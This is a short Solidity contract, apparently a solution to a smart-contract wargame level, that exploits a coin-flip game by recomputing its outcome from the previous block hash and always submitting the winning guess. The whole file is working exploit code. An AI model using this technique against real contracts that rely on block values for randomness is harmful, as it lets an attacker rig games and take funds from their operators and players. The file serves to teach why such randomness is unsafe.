// SPDX-License-Identifier: MIT
pragma solidity ^0.8.6;

interface ICoinFlip{
    function flip(bool _guess) external returns (bool);
}

contract hackCoinFlip {
    ICoinFlip public originalContract = ICoinFlip(0xC6595CAE61422df5c9189dea986490c083561241); 
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function hackFlip(bool _guess) public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true: false;

        if (side == _guess){
            originalContract.flip(_guess);
        } else{
            originalContract.flip(!_guess);
        }

    }
}